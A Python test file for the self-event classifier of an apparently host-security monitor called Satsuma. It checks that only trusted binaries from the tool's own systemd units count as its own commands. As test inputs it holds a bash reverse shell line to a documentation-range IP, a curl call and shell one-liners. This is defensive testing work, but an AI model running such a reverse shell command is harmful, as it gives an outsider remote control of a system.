"""Satsuma's own commands are kept apart from other events (2.2.32).

Satsuma'nın kendi komutları diğer olaylardan ayrı tutulur.
"""
from types import SimpleNamespace as NS

from satsuma import flow as F
from satsuma.pipeline import Pipeline
from satsuma.self_events import SelfClassifier
from satsuma.smart_rules import SmartRuleEngine
from satsuma.store import Store
import run_satsuma_teams as T

def host(pid, cmd, exe, starttime=1, ppid=1, **extra):
    return {'source': 'audit', 'action': 'execve', 'pid': pid, 'ppid': ppid, 'uid': 0,
            'exe': exe, 'cmd': cmd, 'starttime': starttime, **extra}


def proc_tree(tmp_path, pid, unit):
    folder = tmp_path / 'proc' / str(pid)
    folder.mkdir(parents=True)
    (folder / 'cgroup').write_text('0::/system.slice/' + unit + '\n')
    return tmp_path / 'proc'


def test_own_command_needs_satsuma_unit_and_trusted_binary(tmp_path):
    proc = proc_tree(tmp_path, 900, 'satsuma-network-identity.service')
    proc_tree(tmp_path, 901, 'user@1000.service')
    trusted = lambda path: path.startswith('/usr/')
    own = SelfClassifier(proc_root=str(proc), trusted=trusted)
    # ended child of a Satsuma unit: the parent's unit decides
    assert own.is_own(host(5000, '/usr/sbin/ip -j address show', '/usr/sbin/ip', ppid=900))
    # payload outside a trusted path, or a shell, is never own
    assert not own.is_own(host(5001, '/tmp/x', '/tmp/x', ppid=900))
    assert not own.is_own(host(5002, 'bash -c id', '/usr/bin/bash', ppid=900))
    assert not own.is_own(host(5003, 'curl http://x', '/usr/bin/curl', ppid=900))
    # interpreter counts only for Satsuma's own code
    assert own.is_own(host(5004, '/usr/bin/python3 /opt/satsuma-core/main.py', '/usr/bin/python3', ppid=900))
    assert not own.is_own(host(5005, 'python3 -c "import os"', '/usr/bin/python3', ppid=900))
    # another unit is never own, nor a user unit named like Satsuma
    assert not own.is_own(host(5006, 'ip a', '/usr/sbin/ip', ppid=901))
    assert not own.is_own(host(5007, 'ip a', '/usr/sbin/ip', cgroup='0::/user.slice/satsuma-x.service'))
    assert own.health()['own_events'] == 2


def test_own_events_stay_in_the_chain_but_not_in_rules(tmp_path):
    store = Store(tmp_path, test=True)
    flow = F.ProcessFlow()
    receiver = F.FlowReceiver(path=tmp_path / 's')
    engine = SmartRuleEngine()
    pipeline = Pipeline(store, {'response_enabled': False})
    pipeline.flow_sink = receiver.put
    pipeline._self = NS(is_own=lambda raw: True, health=lambda: {})
    pipeline.ingest_host(host(77, 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1', '/usr/bin/bash'))
    result = T._flow_tick(store, {'investigation_enabled': False}, pipeline, engine, flow, receiver)
    assert result == {'events': 1, 'findings': 0}
    assert flow.snapshot(77, 1)['chain'][0]['satsuma'] is True
    assert flow.window_rows(0) == [] and flow.health()['own_events'] == 1

